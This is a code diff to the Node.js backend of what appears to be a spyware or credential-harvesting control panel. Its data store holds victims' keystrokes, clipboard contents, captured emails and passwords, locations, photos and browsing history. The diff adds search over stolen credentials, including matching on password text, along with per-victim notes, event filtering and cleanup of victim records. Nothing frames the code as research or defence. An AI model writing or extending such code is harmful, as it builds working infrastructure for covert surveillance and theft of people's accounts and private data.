@@ -807,6 +807,22 @@ app.get('/api/search', requireAuth, (req, res) => {
     ).slice(0, maxPerType);
     if (errorMatches.length) results.errors = errorMatches;
 
+    // Search credentials
+    const credMatches = (store.credentials || []).filter(c =>
+        (c.email || '').toLowerCase().includes(q) || (c.password || '').toLowerCase().includes(q) ||
+        (c.source || '').toLowerCase().includes(q) || (c.ip || '').includes(q)
+    ).slice(0, maxPerType).map(c => ({ id: c.id, email: c.email, source: c.source, ip: c.ip, timestamp: c.timestamp }));
+    if (credMatches.length) results.credentials = credMatches;
+
+    // Search notes
+    const noteMatches = [];
+    Object.entries(store.notes || {}).forEach(([clientId, notes]) => {
+        notes.forEach(n => {
+            if ((n.text || '').toLowerCase().includes(q)) noteMatches.push({ clientId, text: n.text.slice(0, 100), timestamp: n.timestamp });
+        });
+    });
+    if (noteMatches.length) results.notes = noteMatches.slice(0, maxPerType);
+
     res.json({ query: q, results });
 });
 
@@ -903,7 +919,10 @@ app.get('/api/errors', requireAuth, (req, res) => {
 
 app.get('/api/events', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 500);
-    res.json(store.events.slice(0, limit));
+    const since = req.query.since; // ISO timestamp — only return events newer than this
+    let d = store.events;
+    if (since) d = d.filter(e => e.timestamp > since);
+    res.json(d.slice(0, limit));
 });
 
 app.get('/api/keystrokes', requireAuth, (req, res) => {
@@ -1060,13 +1079,16 @@ app.delete('/api/client/:id', requireAuth, (req, res) => {
     const id = req.params.id;
     delete store.clients[id];
     delete store.deviceInfo[id];
-    store.locations = store.locations.filter(l => l.clientId !== id);
-    store.media = store.media.filter(m => m.clientId !== id);
-    store.photos = store.photos.filter(p => p.clientId !== id);
-    store.errors = store.errors.filter(e => e.clientId !== id);
+    if (store.notes) delete store.notes[id];
+    if (store.tags)  delete store.tags[id];
+    store.locations  = store.locations.filter(l => l.clientId !== id);
+    store.media      = store.media.filter(m => m.clientId !== id);
+    store.photos     = store.photos.filter(p => p.clientId !== id);
+    store.errors     = store.errors.filter(e => e.clientId !== id);
     store.keystrokes = store.keystrokes.filter(k => k.clientId !== id);
-    store.clipboard = store.clipboard.filter(c => c.clientId !== id);
+    store.clipboard  = store.clipboard.filter(c => c.clientId !== id);
     store.pageVisits = store.pageVisits.filter(v => v.clientId !== id);
+    store.events     = store.events.filter(e => e.data?.clientId !== id);
     saveStore();
     console.log(`\u{1F5D1}\u{FE0F}  Client ${id} deleted`);
     res.json({ success: true });
@@ -1236,6 +1258,8 @@ app.delete('/api/clients/stale', requireAuth, (req, res) => {
         if (!cl.online && new Date(cl.lastSeen || 0).getTime() < cutoff) {
             delete store.clients[id];
             delete store.deviceInfo?.[id];
+            if (store.notes) delete store.notes[id];
+            if (store.tags)  delete store.tags[id];
             deleted++;
         }
     });
